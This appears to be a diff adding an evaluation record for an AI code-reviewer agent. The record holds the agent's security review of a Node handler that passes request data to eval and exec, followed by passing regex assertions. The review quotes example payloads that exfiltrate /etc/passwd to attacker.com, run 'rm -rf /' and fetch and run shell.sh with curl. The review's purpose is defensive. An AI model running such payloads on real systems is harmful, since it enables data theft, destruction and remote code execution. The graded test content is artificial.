@@ -1,0 +1,81 @@
+{
+  "agent": "code-reviewer",
+  "case_id": "eval-exec-injection",
+  "model": "sonnet",
+  "provider_models": [
+    "claude-sonnet-5"
+  ],
+  "provider_request_model": "claude-sonnet-5",
+  "provider_response_id": "24ef0e76-0806-4721-9888-42494d748da4",
+  "provider_session_id": "42032cf3-5768-4692-8fc1-49412a05b545",
+  "provider_model_usage": {
+    "claude-sonnet-5": {
+      "cacheCreationInputTokens": 6909,
+      "cacheReadInputTokens": 1262,
+      "contextWindow": 1000000,
+      "costUSD": 0.03685335,
+      "inputTokens": 2,
+      "maxOutputTokens": 64000,
+      "outputTokens": 704,
+      "webSearchRequests": 0
+    }
+  },
+  "prompt_hash": "a02cc5410b11db1a62c0d90f21c97a686eacb0bb19a0a3793c982827e634dda2",
+  "output": "**Verdict: BLOCK**\n\n## Security\n\n1. **Blocking — CWE-94 (Code Injection via eval)**\nQuoted: `const payload = eval('(' + req.body + ')');`\n`req.body` is untrusted HTTP request data passed directly into `eval`. An attacker can send a request body like `1;require('child_process').execSync('curl attacker.com/$(cat /etc/passwd)')` or any arbitrary JS expression, achieving full remote code execution in the Node process.\nFix: use `JSON.parse(req.body)` instead of `eval`, and validate/sanitize the parsed structure before use.\n\n2. **Blocking — CWE-78 (OS Command Injection via exec)**\nQuoted: `exec(`deploy.sh ${payload.target}`);`\n`payload.target` is attacker-controlled (derived from `eval`'d request body) and is interpolated directly into a shell command string executed via `exec`. An attacker can set `target` to something like `myapp; rm -rf / #` or `$(curl attacker.com/shell.sh | sh)` to execute arbitrary shell commands.\nFix: avoid shell interpolation entirely — use `execFile('deploy.sh', [payload.target])` (which passes args without shell parsing), and additionally validate `target` against a strict allowlist pattern (e.g., `/^[a-zA-Z0-9_-]+$/`) before use.\n\n## Correctness\n\n3. **Important — No error handling / input validation**\n`req.body` is used without checking its type or presence, and `payload.target` is used without validating it's defined. If `req.body` is not a valid expression or is undefined, `eval` throws an uncaught exception; if `payload.target` is undefined, the command becomes `deploy.sh undefined`, silently deploying the wrong target. Concrete input: an empty or malformed `req.body` crashes the request handler (unhandled exception -\u003e process/route crash depending on framework error handling); a body like `{}` produces `deploy.sh undefined` executed as a real shell command.\n\n## Testability\n\nNo tests present in the snippet to evaluate.",
+  "assertion_results": [
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?im)(?:^|\\n)\\s*(?:(?:##\\s*)?(?:\\*\\*)?Verdict:\\s*)?(?:\\*\\*)?BLOCK(?:\\*\\*)?(?:\\b|:)"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "CWE-94"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "CWE-78|command injection"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?i)eval|exec"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?i)evidence|attack vector|quoted evidence|request data|untrusted"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?i)fix|replace|execFile|JSON\\.parse"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    }
+  ],
+  "status": "pass",
+  "passed": true,
+  "input_tokens": 2,
+  "output_tokens": 704,
+  "cost_usd": 0.03685335,
+  "duration_ms": 9343
+}
